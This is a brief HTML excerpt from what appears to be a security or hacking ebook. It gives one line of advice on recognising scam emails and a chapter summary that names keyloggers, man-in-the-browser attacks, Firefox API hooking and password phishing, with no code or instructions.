<p class="calibre2">For scam emails, keep in mind that no one should ask you about your password over email, or even post a login link to you by email.</p>


            </article>

            
        </section>
    

        <section>

                            <header>
                    </header><h1 class="header-title" id="calibre_pb_0">Summary</h1>
                
            
            <article>
                
<p class="calibre2">In this chapter, we saw how to configure a keylogger and also dealt with password manager to securely store the device credentials. We also learned about a new method—Man in the Browser. Further, we saw the process of Firefox API hooking with Immunity Debugger and performed the password phishing process.</p>
<p class="calibre2">In the end, we discussed the countermeasures on how to protect yourself and secure your account from the attacks.</p>
<p class="calibre2">In the next chapter, we will set up our own hacking environment in VirtualBox.</p>


            </article>

            
        </section>
    </body></html>